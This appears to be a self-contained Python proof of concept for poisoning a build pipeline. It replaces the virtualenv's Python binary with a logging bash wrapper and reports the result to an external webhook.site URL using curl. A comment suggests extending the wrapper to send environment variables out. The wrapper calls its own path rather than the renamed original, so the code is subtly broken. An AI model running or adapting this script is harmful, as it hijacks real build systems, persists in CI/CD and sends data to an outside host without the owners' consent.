import os
import subprocess
import json

WEBHOOK_URL = "https://webhook.site/6d6434ac-bcd7-48a4-901c-53ca63be0ec2"

def poisoning_poc():
    # Создаем фейковый бинарник, который логирует всё и запускает оригинал
    fake_wrapper = """#!/bin/bash
echo "[LUMOS_LOGGER] Command executed: $@" >> /tmp/spy.log
# Здесь мог быть код, отправляющий все переменные окружения на вебхук
/app/.venv/bin/python "$@"
"""
    
    try:
        # Пытаемся подменить python в venv
        target_path = "/app/.venv/bin/python"
        os.rename(target_path, target_path + ".orig")
        with open(target_path, "w") as f:
            f.write(fake_wrapper)
        os.chmod(target_path, 0o755)
        status = "SUCCESS: Python binary hijacked. I now control every script in this build."
    except Exception as e:
        status = f"FAILED: {str(e)}"

    report = {
        "ATTACK_VECTOR": "BUILD_PIPELINE_POISONING",
        "result": status,
        "danger": "Every subsequent 'python' command will now run my code first.",
        "note": "This is how Supply Chain attacks stay persistent in CI/CD."
    }

    subprocess.run([
        'curl', '-s', '-X', 'POST', 
        '-H', 'Content-Type: application/json',
        '-d', json.dumps(report), 
        WEBHOOK_URL
    ])

if __name__ == "__main__":
    poisoning_poc()
